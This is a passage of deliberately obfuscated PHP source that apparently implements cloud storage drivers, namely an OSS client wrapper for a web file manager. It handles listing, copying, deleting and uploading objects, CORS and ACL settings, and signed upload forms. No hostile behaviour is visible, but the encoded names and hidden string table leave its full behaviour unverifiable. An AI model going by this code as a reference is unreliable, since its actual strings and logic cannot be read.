$›íî‹[1133] . $ÈĞ—ªƒ . $›íî‹[1134]; } else { $Å×šĞö  = (stripos($çŸ›«³, $›íî‹[11]) ? $›íî‹[1135] : $›íî‹[12]) . ($›íî‹[1136] . $çŸ›«³ . $›íî‹[1137] . $Ÿ÷„¬Ôî); } $ëÁ·Å²Â[] = $Å×šĞö ; } $î„ˆ ¸± = array($›íî‹[1138] . $Ú¼•€ÔÃ . $›íî‹[1139], $›íî‹[1140] . $Ú¼•€ÔÃ . $›íî‹[1141], implode($›íî‹[60] . PHP_EOL, $ëÁ·Å²Â), $›íî‹[1142]); $Ä¾‰èÃ‰ = implode(PHP_EOL, $î„ˆ ¸±); if ($äû §ŸÉ && $äû §ŸÉ == $›íî‹[802]) { return $Ä¾‰èÃ‰; } $Á¯—¨ Ï = array($›íî‹[802] => $Ä¾‰èÃ‰, $›íî‹[23] => $©ì¿Ö…); return $äû §ŸÉ ? $Á¯—¨ Ï[$äû §ŸÉ] : $Á¯—¨ Ï; } } goto BµšŠ†®Æ; CğâÑÁ™Ç: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¡Ôª“™ï) { parent::__construct($¡Ôª“™ï); $this->signatureVersion($_SERVER[Å¶¨Şêº][227]); } public function fileOutLink($ˆ“¤çá¶) { $™½¤ˆ™Ã =& $_SERVER[Å¶¨Şêº]; if (substr($ˆ“¤çá¶, 0, 7) == $™½¤ˆ™Ã[1335]) { $ˆ“¤çá¶ = $™½¤ˆ™Ã[1336] . substr($ˆ“¤çá¶, 7); } header($™½¤ˆ™Ã[172] . $ˆ“¤çá¶); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Ú•’ó) { parent::__construct(); include_once SDK_DIR . $_SERVER[Å¶¨Şêº][1392]; $this->_init($Ú•’ó); } public function _init($·•Âô¦¸) { $·»Ø¸Êë =& $_SERVER[Å¶¨Şêº]; $this->config = $·•Âô¦¸; foreach ($·•Âô¦¸ as $¶ñóòƒ => $¾ó¯Ùá) { if (isset($this->{$¶ñóòƒ})) { $this->{$¶ñóòƒ} = $¾ó¯Ùá; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($·»Ø¸Êë[1393] . LNG($·»Ø¸Êë[1394])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $³Ş·Óí¥ =& $_SERVER[Å¶¨Şêº]; $éÉ“Ù¶¹ = new OSS\Model\CorsConfig(); $Êûöµİƒ = new OSS\Model\CorsRule(); $Êûöµİƒ->addAllowedOrigin($³Ş·Óí¥[1395]); $Êûöµİƒ->addAllowedMethod($³Ş·Óí¥[1396]); $Êûöµİƒ->addAllowedMethod($³Ş·Óí¥[1397]); $Êûöµİƒ->addAllowedMethod($³Ş·Óí¥[1398]); $Êûöµİƒ->addAllowedMethod($³Ş·Óí¥[1399]); $Êûöµİƒ->addAllowedMethod($³Ş·Óí¥[171]); $Êûöµİƒ->setMaxAgeSeconds(600); $Êûöµİƒ->addExposeHeader($³Ş·Óí¥[1400]); $Êûöµİƒ->addAllowedHeader($³Ş·Óí¥[1395]); $éÉ“Ù¶¹->addRule($Êûöµİƒ); try { $this->client->putBucketCors($this->bucket, $éÉ“Ù¶¹); } catch (OSS\Core\OssException $·ÚÃî™‘) { return !1; } return !0; } public function getBucketCors() { $Ğ´’Íùµ =& $_SERVER[Å¶¨Şêº]; $¡Ä‹ŠŸ” = null; try { $¡Ä‹ŠŸ” = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÚçÚ¸ß‘) { return null; } if (!$¡Ä‹ŠŸ” || !($ÅÌª‡çø = $¡Ä‹ŠŸ”->getRules())) { return null; } $¡Éò¨Ğ¸ = $ÅÌª‡çø[0]->getAllowedOrigins(); $ğã³¯Ÿ = $ÅÌª‡çø[0]->getAllowedMethods(); $ü»„¿ = $ÅÌª‡çø[0]->getMaxAgeSeconds(); $„èäò« = $ÅÌª‡çø[0]->getExposeHeaders(); $‘ß¼“‡õ = $ÅÌª‡çø[0]->getAllowedHeaders(); return array($Ğ´’Íùµ[199] => isset($¡Éò¨Ğ¸[0]) ? $¡Éò¨Ğ¸[0] : $Ğ´’Íùµ[12], $Ğ´’Íùµ[203] => $ğã³¯Ÿ, $Ğ´’Íùµ[1401] => $ü»„¿, $Ğ´’Íùµ[1402] => isset($„èäò«[0]) ? $„èäò«[0] : $Ğ´’Íùµ[12], $Ğ´’Íùµ[201] => isset($‘ß¼“‡õ[0]) ? $‘ß¼“‡õ[0] : $Ğ´’Íùµ[12]); } public function isBucketCors() { $Ø°¤à³ =& $_SERVER[Å¶¨Şêº]; $ãÁÍ¢ª— = $this->getBucketCors(); if (!$ãÁÍ¢ª— || !is_array($ãÁÍ¢ª—)) { return !1; } if ($ãÁÍ¢ª—[$Ø°¤à³[199]] != $Ø°¤à³[200] || $ãÁÍ¢ª—[$Ø°¤à³[201]] != $Ø°¤à³[200]) { return !1; } $Î©«şÊ = array_map($Ø°¤à³[202], $ãÁÍ¢ª—[$Ø°¤à³[203]]); if (!is_array($Î©«şÊ)) { $Î©«şÊ = array(); } $éå¢ÉœÌ = array($Ø°¤à³[204], $Ø°¤à³[205], $Ø°¤à³[206], $Ø°¤à³[207], $Ø°¤à³[208]); $®Ô­î‡ = array_diff($éå¢ÉœÌ, $Î©«şÊ); return empty($®Ô­î‡); } public function mkfile($É¡ıÆ¹¶, $¡ö°‡·ù = '', $áäìØöØ = REPEAT_RENAME) { $±÷ø¥„± = $this->setContent($É¡ıÆ¹¶, $¡ö°‡·ù); if ($±÷ø¥„± !== !1) { return $this->getPathOuter($É¡ıÆ¹¶); } return !1; } public function mkdir($³‚€êç¢, $§Œ¡ŒßÀ = REPEAT_SKIP) { if ($§Œ¡ŒßÀ && $this->_isFolder($³‚€êç¢)) { return $this->getPathOuter($³‚€êç¢); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($³‚€êç¢)); } catch (OSS\Core\OssException $ó‘¥«ˆ­) { return !1; } return $this->getPathOuter($³‚€êç¢); } private function fileList($°¬ šÜó, $Õùûú† = '', $ÓØı®¤¬ = 0) { $ÙàÒñÜ… =& $_SERVER[Å¶¨Şêº]; $°¬ šÜó = trim($°¬ šÜó, $ÙàÒñÜ…[8]); $·ñ‹ÊêÙ = empty($°¬ šÜó) && $°¬ šÜó !== $ÙàÒñÜ…[209] ? $ÙàÒñÜ…[12] : $°¬ šÜó . $ÙàÒñÜ…[8]; $ƒ±ÙÍ‰ = $ÙàÒñÜ…[12]; $…ŸÛıÜµ = 1000; $³ú”©˜¬ = $åé”èÂ = array(); while (!0) { check_abort(); $¥‚÷ÅÇä = array($ÙàÒñÜ…[1403] => $Õùûú†, $ÙàÒñÜ…[1404] => $·ñ‹ÊêÙ, $ÙàÒñÜ…[1405] => $…ŸÛıÜµ, $ÙàÒñÜ…[1406] => $ƒ±ÙÍ‰); try { $ôòàöÇ = $this->client->listObjects($this->bucket, $¥‚÷ÅÇä); } catch (OSS\Core\OssException $¼ŒÎâÈ·) { break; } $ƒ±ÙÍ‰ = $ôòàöÇ->getNextMarker(); $À…‡õè = $ôòàöÇ->getObjectList(); $Êû·éãÂ = $ôòàöÇ->getPrefixList(); foreach ($À…‡õè as $Ö›ê×) { if ($Ö›ê×->getKey() == $·ñ‹ÊêÙ) { continue; } $¹í¬Äö = $Ö›ê×->getKey(); $ŸõªˆÅ” = $Ö›ê×->getSize(); $¤Øö¯Õ = $Ö›ê×->getLastModified(); $Œ²ŒîóÎ = $ÓØı®¤¬ ? array($ÙàÒñÜ…[42] => $¹í¬Äö, $ÙàÒñÜ…[87] => $ŸõªˆÅ”, $ÙàÒñÜ…[191] => strtotime($¤Øö¯Õ)) : $¹í¬Äö; $©Â÷÷Œú = $ŸõªˆÅ” == 0 && substr($¹í¬Äö, strlen($¹í¬Äö) - 1, 1) == $ÙàÒñÜ…[8] ? !0 : !1; $•‚Á½ºß = array($ÙàÒñÜ…[87] => $ŸõªˆÅ”, $ÙàÒñÜ…[1407] => $ŸõªˆÅ”, $ÙàÒñÜ…[96] => strtotime($¤Øö¯Õ), $ÙàÒñÜ…[1408] => $¤Øö¯Õ); $this->cacheMethodInfoSet($¹í¬Äö, $©Â÷÷Œú, $•‚Á½ºß); if ($©Â÷÷Œú) { $³ú”©˜¬[] = $¹í¬Äö; continue; } $åé”èÂ[] = $Œ²ŒîóÎ; } foreach ($Êû·éãÂ as $®§¦‚‰) { $³ú”©˜¬[] = $®§¦‚‰->getPrefix(); $this->cacheMethodInfoSet($®§¦‚‰->getPrefix(), !0); } if ($ƒ±ÙÍ‰ === $ÙàÒñÜ…[12]) { break; } } $this->cacheMethodInfoSet($°¬ šÜó, !0); return array($ÙàÒñÜ…[93] => $³ú”©˜¬, $ÙàÒñÜ…[94] => $åé”èÂ); } public function copyFile($¬Ôë³£ı, $ Ù±ö¹ ) { $Ç¢Ğ§Œ± = $this->size($¬Ôë³£ı); if ($Ç¢Ğ§Œ± < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¬Ôë³£ı, $this->bucket, $this->pathEncode($ Ù±ö¹ )); } catch (OSS\Core\OssException $ğíóçÛº) { return !1; } return $this->getPathOuter($ Ù±ö¹ ); } $ıñ™¦Õ· = $this->multiCopyObject($¬Ôë³£ı, $ Ù±ö¹ , $Ç¢Ğ§Œ±); return $ıñ™¦Õ· ? $this->getPathOuter($ Ù±ö¹ ) : !1; } private function multiCopyObject($¤Ş™È•¬, $—şû÷•œ, $Éë©ââ) { $²à—ê§Ç =& $_SERVER[Å¶¨Şêº]; try { $å˜­ê‰ = array(); if ($®ŒŠ¼Àà = $this->hashMd5($¤Ş™È•¬)) { $å˜­ê‰ = array(OSS\OssClient::OSS_HEADERS => array($²à—ê§Ç[1409] => $®ŒŠ¼Àà)); } $—Ó•àõÔ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($—şû÷•œ), $å˜­ê‰); $‹ê‚õ‘ = 1; $ñóû¸Ë· = 0; $¾Í–‚¬Ô = array(); $‰¤™­Ì = 1024 * 1024 * 10; $¶„´ÍÈ = $this->client->generateMultiuploadParts($Éë©ââ, $‰¤™­Ì); foreach ($¶„´ÍÈ as $«½ ãÆ => $‡…«Ğİ) { $ÏÅ‘Ë¾º = $ñóû¸Ë· + (int) $‡…«Ğİ[$²à—ê§Ç[1410]]; $¸…ÛÜ = (int) $‡…«Ğİ[$²à—ê§Ç[347]] + $ÏÅ‘Ë¾º - 1; $´éºÙü˜ = array($²à—ê§Ç[1411] => $ÏÅ‘Ë¾º, $²à—ê§Ç[1412] => $¸…ÛÜ); $¾Í–‚¬Ô[] = $this->client->uploadPartCopy($this->bucket, $¤Ş™È•¬, $this->bucket, $this->pathEncode($—şû÷•œ), $‹ê‚õ‘, $—Ó•àõÔ, $´éºÙü˜); $‹ê‚õ‘ = $‹ê‚õ‘ + 1; } $ªáüä = array(); foreach ($¾Í–‚¬Ô as $«½ ãÆ => $¤ç¿€Ñ) { $ªáüä[] = array($²à—ê§Ç[1413] => $«½ ãÆ + 1, $²à—ê§Ç[1414] => $¤ç¿€Ñ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($—şû÷•œ), $—Ó•àõÔ, $ªáüä); } catch (OSS\Core\OssException $¤»‰–©À) { return !1; } return !0; } public function moveFile($ºâÂœÕ†, $öÄí¹¾) { if ($this->copyFile($ºâÂœÕ†, $öÄí¹¾)) { $this->remove($ºâÂœÕ†); return $this->getPathOuter($öÄí¹¾); } return !1; } public function delFile($¤ºÖ«Œ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¤ºÖ«Œ)); } catch (OSS\Core\OssException $¹â›ò›ğ) { return !1; } return !0; } public function delFolder($€ƒ‰€éï) { $óİ™ğ˜ä =& $_SERVER[Å¶¨Şêº]; if (!$this->exist($€ƒ‰€éï)) { return !0; } $this->listItemCache = !1; $òÇØ«™Ô = $this->fileList($€ƒ‰€éï); $this->listItemCache = !0; $Ò“¹ö“‰ = trim($€ƒ‰€éï, $óİ™ğ˜ä[8]) . $óİ™ğ˜ä[8]; if (!empty($€ƒ‰€éï) && $€ƒ‰€éï !== $óİ™ğ˜ä[209] && !in_array($Ò“¹ö“‰, $òÇØ«™Ô[$óİ™ğ˜ä[93]])) { $òÇØ«™Ô[$óİ™ğ˜ä[93]][] = $Ò“¹ö“‰; } $Ô¯íø¼ = $this->delByBatch($òÇØ«™Ô[$óİ™ğ˜ä[94]]); if (!$Ô¯íø¼) { return !1; } $Ô¯íø¼ = $this->delByBatch($òÇØ«™Ô[$óİ™ğ˜ä[93]]); if (!$Ô¯íø¼) { return !1; } return $this->delFile($Ò“¹ö“‰); } private function delByBatch($¢üÕĞº„) { foreach (array_chunk($¢üÕĞº„, 1000) as $á¤˜¤äİ) { try { $this->client->deleteObjects($this->bucket, $á¤˜¤äİ); } catch (OSS\Core\OssException $¥ğã»™–) { return !1; } } return !0; } public function rename($«êóµ™Œ, $’ÓüÏÕ») { return $this->renameObject($«êóµ™Œ, $’ÓüÏÕ»); } private function fileInfo($ºó§ ¦¥, $…’âî¶š = false, $ÓŒØ¡„¡ = array()) { $˜“È°Ù™ =& $_SERVER[Å¶¨Şêº]; $×óû”¤¹ = array($˜“È°Ù™[42] => $this->pathThis($ºó§ ¦¥), $˜“È°Ù™[95] => $this->getPathOuter($ºó§ ¦¥), $˜“È°Ù™[43] => $˜“È°Ù™[211], $˜“È°Ù™[87] => isset($ÓŒØ¡„¡[$˜“È°Ù™[87]]) ? $ÓŒØ¡„¡[$˜“È°Ù™[87]] : 0, $˜“È°Ù™[185] => $this->ext($ºó§ ¦¥)); if ($…’âî¶š) { return $×óû”¤¹; } $×óû”¤¹[$˜“È°Ù™[212]] = $×óû”¤¹[$˜“È°Ù™[96]] = 0; $×óû”¤¹[$˜“È°Ù™[213]] = $×óû”¤¹[$˜“È°Ù™[214]] = !0; if (empty($ÓŒØ¡„¡)) { $úÓÓ‰âÑ = $this->objectMeta($ºó§ ¦¥); if (!$úÓÓ‰âÑ) { return $×óû”¤¹; } $ÓŒØ¡„¡ = array($˜“È°Ù™[96] => strtotime($úÓÓ‰âÑ[$˜“È°Ù™[1408]]), $˜“È°Ù™[87] => $úÓÓ‰âÑ[$˜“È°Ù™[1407]] + 0); } if (isset($ÓŒØ¡„¡[$˜“È°Ù™[87]])) { $×óû”¤¹[$˜“È°Ù™[87]] = $ÓŒØ¡„¡[$˜“È°Ù™[87]]; } if (isset($ÓŒØ¡„¡[$˜“È°Ù™[96]])) { $×óû”¤¹[$˜“È°Ù™[96]] = $ÓŒØ¡„¡[$˜“È°Ù™[96]]; } if (isset($ÓŒØ¡„¡[$˜“È°Ù™[191]]) && !trim($×óû”¤¹[$˜“È°Ù™[96]])) { $×óû”¤¹[$˜“È°Ù™[96]] = $ÓŒØ¡„¡[$˜“È°Ù™[191]]; } return $×óû”¤¹; } private function folderInfo($—˜Õî…Ë, $ÍºÙõ¢¶ = false, $†¨®ÜÖÂ = array()) { $ŠĞ´Úşà =& $_SERVER[Å¶¨Şêº]; $ú‚ ‰ = array($ŠĞ´Úşà[42] => $this->pathThis($—˜Õî…Ë), $ŠĞ´Úşà[95] => $this->getPathOuter($ŠĞ´Úşà[8] . $—˜Õî…Ë), $ŠĞ´Úşà[43] => $ŠĞ´Úşà[86]); if ($ÍºÙõ¢¶) { return $ú‚ ‰; } $ú‚ ‰[$ŠĞ´Úşà[212]] = $ú‚ ‰[$ŠĞ´Úşà[96]] = 0; $ú‚ ‰[$ŠĞ´Úşà[213]] = $ú‚ ‰[$ŠĞ´Úşà[214]] = !0; if (empty($†¨®ÜÖÂ)) { $—˜Õî…Ë = rtrim($—˜Õî…Ë, $ŠĞ´Úşà[8]) . $ŠĞ´Úşà[8]; $Ìô§ïâ = $this->objectMeta($—˜Õî…Ë); if (!$Ìô§ïâ) { return $ú‚ ‰; } $†¨®ÜÖÂ = array($ŠĞ´Úşà[212] => $Ìô§ïâ[$ŠĞ´Úşà[511]][$ŠĞ´Úşà[1415]], $ŠĞ´Úşà[96] => strtotime($Ìô§ïâ[$ŠĞ´Úşà[1408]])); } if (isset($†¨®ÜÖÂ[$ŠĞ´Úşà[96]])) { $ú‚ ‰[$ŠĞ´Úşà[96]] = $†¨®ÜÖÂ[$ŠĞ´Úşà[96]]; } if (isset($†¨®ÜÖÂ[$ŠĞ´Úşà[212]])) { $ú‚ ‰[$ŠĞ´Úşà[212]] = $†¨®ÜÖÂ[$ŠĞ´Úşà[212]]; } return $ú‚ ‰; } public function listPath($Ìé…ƒå…, $…Õ•ÂÄ³ = false) { $¦ñ©Ëóá =& $_SERVER[Å¶¨Şêº]; $¼Œßêú÷ = $this->fileList($Ìé…ƒå…, $¦ñ©Ëóá[8], !0); foreach ($¼Œßêú÷[$¦ñ©Ëóá[93]] as $®á¨ù¿Ü => $‹ï¨å•ô) { $¼Œßêú÷[$¦ñ©Ëóá[93]][$®á¨ù¿Ü] = $this->folderInfo($‹ï¨å•ô, $…Õ•ÂÄ³, $‹ï¨å•ô); } foreach ($¼Œßêú÷[$¦ñ©Ëóá[94]] as $®á¨ù¿Ü => $‹ï¨å•ô) { $¼Œßêú÷[$¦ñ©Ëóá[94]][$®á¨ù¿Ü] = $this->fileInfo($‹ï¨å•ô[$¦ñ©Ëóá[42]], $…Õ•ÂÄ³, $‹ï¨å•ô); } return $¼Œßêú÷; } protected function infoChildren($ §Ù¯¯, &$É¹²¿Ûû) { $ê½š¸ÙÖ =& $_SERVER[Å¶¨Şêº]; $èØÄ¨É€ = $this->fileList($ §Ù¯¯, $ê½š¸ÙÖ[12], !0); $É¹²¿Ûû[$ê½š¸ÙÖ[89]] += count($èØÄ¨É€[$ê½š¸ÙÖ[93]]); $É¹²¿Ûû[$ê½š¸ÙÖ[88]] += count($èØÄ¨É€[$ê½š¸ÙÖ[94]]); foreach ($èØÄ¨É€[$ê½š¸ÙÖ[94]] as $Â×‹œåÒ) { if (!$Â×‹œåÒ || !$Â×‹œåÒ[$ê½š¸ÙÖ[87]]) { continue; } $É¹²¿Ûû[$ê½š¸ÙÖ[87]] += $Â×‹œåÒ[$ê½š¸ÙÖ[87]]; } } public function has($½¹Â°—, $ºé­­àŞ = false, $´•ç’§Á = true) { $”¢Ôâ‘ =& $_SERVER[Å¶¨Şêº]; $½¹Â°— = trim($½¹Â°—, $”¢Ôâ‘[8]); $ü¯›Ú†Â = empty($½¹Â°—) && $½¹Â°— !== $”¢Ôâ‘[209] ? $”¢Ôâ‘[12] : $½¹Â°— . $”¢Ôâ‘[8]; $İ¦ÜÑüû = $”¢Ôâ‘[12]; $†ğ™¸Ë¤ = 500; $¬æ‰·Ø = $ş‘¼¿á = 0; while (!0) { check_abort(); $Ë÷ÕÏ×ò = array($”¢Ôâ‘[1403] => $”¢Ôâ‘[8], $”¢Ôâ‘[1404] => $ü¯›Ú†Â, $”¢Ôâ‘[1405] => $†ğ™¸Ë¤, $”¢Ôâ‘[1406] => $İ¦ÜÑüû); try { $ì½ûŞú = $this->client->listObjects($this->bucket, $Ë÷ÕÏ×ò); } catch (OSS\Core\OssException $è­†Ì¡) { break; } $İ¦ÜÑüû = $ì½ûŞú->getNextMarker(); $Å™Ñõß§ = $ì½ûŞú->getObjectList(); $¸¶õëœ = $ì½ûŞú->getPrefixList(); if ($ºé­­àŞ) { if (count($Å™Ñõß§) > 1 || count($Å™Ñõß§) == 1 && $Å™Ñõß§[0]->getKey() != $ü¯›Ú†Â) { $¬æ‰·Ø += count($Å™Ñõß§) - 1; } if (!empty($¸¶õëœ)) { $ş‘¼¿á += count($¸¶õëœ); } if ($İ¦ÜÑüû === $”¢Ôâ‘[12]) { break; } continue; } if ($´•ç’§Á) { if (!empty($Å™Ñõß§)) { if (count($Å™Ñõß§) > 1 || $Å™Ñõß§[0]->getKey() != $ü¯›Ú†Â) { return !0; } } } else { if (!empty($¸¶õëœ)) { return !0; } } if ($İ¦ÜÑüû === $”¢Ôâ‘[12]) { break; } } if ($ºé­­àŞ) { return array($”¢Ôâ‘[218] => $¬æ‰·Ø, $”¢Ôâ‘[219] => $ş‘¼¿á); } return !1; } public function listAll($›Ûî’ø) { $áĞÚ™ŠŠ =& $_SERVER[Å¶¨Şêº]; $Í†Ş´îâ = $this->fileList($›Ûî’ø, $áĞÚ™ŠŠ[12], !0); $Ğ—·¯¹õ = array_to_keyvalue($Í†Ş´îâ[$áĞÚ™ŠŠ[94]], $áĞÚ™ŠŠ[42]); foreach ($Í†Ş´îâ[$áĞÚ™ŠŠ[93]] as $Ü–†—¤Û) { if (is_string($Ü–†—¤Û)) { $Ğ—·¯¹õ[$Ü–†—¤Û] = array($áĞÚ™ŠŠ[87] => 0); } } return $this->listAllFiles($›Ûî’ø, $Ğ—·¯¹õ); } public function canRead($¹¥“Î¥î) { $§©ßÕ÷ =& $_SERVER[Å¶¨Şêº]; $‰õòÊ´ë = $this->pathAcl($¹¥“Î¥î); return $‰õòÊ´ë == $§©ßÕ÷[1416] || $‰õòÊ´ë == $§©ßÕ÷[556] ? !0 : !1; } public function canWrite($„Ã‹‹“) { $¸ñ¼ŒÔ = $this->pathAcl($„Ã‹‹“); return $¸ñ¼ŒÔ == $_SERVER[Å¶¨Şêº][556] ? !0 : !1; } public function pathAcl($Ù®ÇİÓ›) { $µŠ§ç×ı =& $_SERVER[Å¶¨Şêº]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $­½úß› = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ù®ÇİÓ›)); } catch (OSS\Core\OssException $¿ò¶ú—Ø) { return !1; } $§ÓİµİŠ = $­½úß› == $µŠ§ç×ı[47] ? $this->bucketAcl : $­½úß›; if ($§ÓİµİŠ == $µŠ§ç×ı[1417]) { return $µŠ§ç×ı[1416]; } if ($§ÓİµİŠ == $µŠ§ç×ı[1418]) { return $µŠ§ç×ı[556]; } return $§ÓİµİŠ; } private function chmodPath($ÖÓúó•¼, $Â›Éçó = '') { $ë³š‹ó” =& $_SERVER[Å¶¨Şêº]; $³ç±Áñà = empty($Â›Éçó) ? $ë³š‹ó”[1418] : $Â›Éçó; $”··ÎÇÄ = array($ë³š‹ó”[47], $ë³š‹ó”[210], $ë³š‹ó”[1417], $ë³š‹ó”[1418]); if (!in_array($³ç±Áñà, $”··ÎÇÄ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÖÓúó•¼), $³ç±Áñà); } catch (OSS\Core\OssException $æ–ıÀ³¯) { return !1; } return !0; } public function getContent($°Ÿ±’Å) { return $this->fileSubstr($°Ÿ±’Å, -1); } public function setContent($‡ÎûšÙ, $’ğ½äò† = '') { $Æ³ë±ü =& $_SERVER[Å¶¨Şêº]; try { $ğ¡äçÑš = $this->trafficLimit($Æ³ë±ü[1419]); $æÉÖ¡ª’ = $this->client->putObject($this->bucket, $this->pathEncode($‡ÎûšÙ), $’ğ½äò†, $ğ¡äçÑš); } catch (OSS\Core\OssException $ª“îŒ–ä) { return !1; } $ºğÆ‡‚Ú = array($Æ³ë±ü[1409] => trim($æÉÖ¡ª’[$Æ³ë±ü[1420]], $Æ³ë±ü[129]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‡ÎûšÙ))); $this->updateObjMeta($‡ÎûšÙ, $ºğÆ‡‚Ú); return isset($æÉÖ¡ª’[$Æ³ë±ü[1421]][$Æ³ë±ü[1368]]) ? !0 : !1; } private function updateObjMeta($¨×‡ƒš, $şŸÖèé¸) { $¨×‡ƒš = $this->pathEncode($¨×‡ƒš); try { $ğö…¼•é = array(OSS\OssClient::OSS_HEADERS => $şŸÖèé¸); $this->client->copyObject($this->bucket, $¨×‡ƒš, $this->bucket, $¨×‡ƒš, $ğö…¼•é); } catch (OSS\Core\OssException $×¿„ô›‡) { return !1; } return !0; } public function upload($‹©ôºĞœ, $ŸÄ¸†, $ş¤›­ü’ = false, $«Ä·† = REPEAT_REPLACE) { $á„×‚¼ï =& $_SERVER[Å¶¨Şêº]; $÷Ü‘ÙÀÃ = trim($‹©ôºĞœ, $á„×‚¼ï[8]); $øèìëÚâ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($á„×‚¼ï[1409] => @md5_file($ŸÄ¸†)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‹©ôºĞœ))); $øèìëÚâ = $this->trafficLimit($á„×‚¼ï[1419], $øèìëÚâ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($÷Ü‘ÙÀÃ), $ŸÄ¸†, $øèìëÚâ); } catch (OSS\Core\OssException $¹èĞã—ë) { return !1; } return $this->getPathOuter($‹©ôºĞœ); } public function getHost() { $ºÑä‰Æú =& $_SERVER[Å¶¨Şêº]; $Ôğ¤©Ó™ = explode($ºÑä‰Æú[195], parent::getHost()); return $Ôğ¤©Ó™[0] . $ºÑä‰Æú[195] . $this->bucket . $ºÑä‰Æú[10] . $Ôğ¤©Ó™[1]; } public function uploadFormData($ë½çŒ²„, $†ÂÅü‡Ç = 3600) { $™ÆÚ¬¥ =& $_SERVER[Å¶¨Şêº]; if (!($®ğ‡÷¬œ = $this->getHost())) { return !1; } $«‡¯ÛÉï = $†ÂÅü‡Ç; $¢à‡İ¸È = date($™ÆÚ¬¥[1422], time() + $«‡¯ÛÉï); $ µƒ„ìõ = new DateTime($¢à‡İ¸È); $Å»™–ã = $ µƒ„ìõ->format(DateTime::ISO8601); $Ô‡–æ— = strpos($Å»™–ã, $™ÆÚ¬¥[306]); $Å»™–ã = substr($Å»™–ã, 0, $Ô‡–æ—) . $™ÆÚ¬¥[1423]; $©ä…ä± = 1048576000 * 5; $—¬ä†» = $this->pathFather($ë½çŒ²„); $İ¦º‚¹’ = array($™ÆÚ¬¥[1322] => $Å»™–ã, $™ÆÚ¬¥[1323] => array(array($™ÆÚ¬¥[1424], 0, $©ä…ä±), array($™ÆÚ¬¥[1326], $™ÆÚ¬¥[1327], $—¬ä†»))); $ßã¶Á Ú = base64_encode(json_encode($İ¦º‚¹’)); $†²»îœÎ = base64_encode(hash_hmac($™ÆÚ¬¥[242], $ßã¶Á Ú, $this->secret, !0)); $§–‰ÎØ = array($™ÆÚ¬¥[1332] => $ßã¶Á Ú, $™ÆÚ¬¥[1425] => $this->accessKey, $™ÆÚ¬¥[1328] => $™ÆÚ¬¥[1320], $™ÆÚ¬¥[1426] => $†²»îœÎ, $™ÆÚ¬¥[193] => $®ğ‡÷¬œ); $§–‰ÎØ = $this->trafficLimit($™ÆÚ¬¥[1419], $§–‰ÎØ); return $§–‰ÎØ; } public function multiUploadFormData($¢×Ï°³Ñ, $â™Ê¬Õ„ = 3600) { $ÏÀÈ–¢“ =& $_SERVER[Å¶¨Şêº]; if (!($æŸé´€‰ = $this->getHost())) { return !1; } $×àŸÜ³ = $this->trafficLimit($ÏÀÈ–¢“[1419]); $‹Î÷ìæâ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¢×Ï°³Ñ), $×àŸÜ³); return array($ÏÀÈ–¢“[234] => $‹Î÷ìæâ, $ÏÀÈ–¢“[193] => $æŸé´€‰ . $ÏÀÈ–¢“[8] . $this->pathEncode($¢×Ï°³Ñ), $ÏÀÈ–¢“[235] => gmdate($ÏÀÈ–¢“[1427]), $ÏÀÈ–¢“[105] => $¢×Ï°³Ñ); } public function multiUploadAuthData($»›„ä ’, $ªª«³¢ğ = array()) { $Šè­§îÉ =& $_SERVER[Å¶¨Şêº]; $ñÓş¾ù = isset($ªª«³¢ğ[$Šè­§îÉ[235]]) ? $ªª«³¢ğ[$Šè­§îÉ[235]] : gmdate($Šè­§îÉ[1427]); $÷Ùìö”û = isset($ªª«³¢ğ[$Šè­§îÉ[185]]) ? $ªª«³¢ğ[$Šè­§îÉ[185]] : $Šè­§îÉ[12]; $ ÖÇ†ö¯ = $»›„ä ’; if (isset($ªª«³¢ğ[$Šè­§îÉ[105]])) { $ ÖÇ†ö¯ = $ªª«³¢ğ[$Šè­§îÉ[105]]; unset($ªª«³¢ğ[$Šè­§îÉ[105]]); } if (isset($ªª«³¢ğ[$Šè­§îÉ[236]])) { $ªª«³¢ğ[$Šè­§îÉ[235]] = $ñÓş¾ù; return $this->listUploadParts($ ÖÇ†ö¯, $ªª«³¢ğ); } $Á¨°ë · = array($Šè­§îÉ[237], $Šè­§îÉ[12], $Šè­§îÉ[131], $ñÓş¾ù, "\x78\55\157\163\x73\55\144\141\164\x65\x3a{$ñÓş¾ù}", $Šè­§îÉ[8] . $this->bucket . $Šè­§îÉ[8] . $ ÖÇ†ö¯ . $÷Ùìö”û); if (strpos($÷Ùìö”û, $Šè­§îÉ[238]) === 0) { $Á¨°ë ·[0] = $Šè­§îÉ[239]; if ($íã³úÙ¿ = $this->trafficLimit($Šè­§îÉ[1419])) { $ ÖÇ†ö¯ = $Šè­§îÉ[1428]; array_splice($Á¨°ë ·, 5, 0, $ ÖÇ†ö¯ . $Šè­§îÉ[4] . $íã³úÙ¿[$ ÖÇ†ö¯]); } } if (isset($ªª«³¢ğ[$Šè­§îÉ[240]]) && $ªª«³¢ğ[$Šè­§îÉ[240]] == $Šè­§îÉ[241]) { $Á¨°ë ·[0] = $Šè­§îÉ[241]; } if (!empty($ªª«³¢ğ[$Šè­§îÉ[1429]])) { $³Ğº®Û¾ = 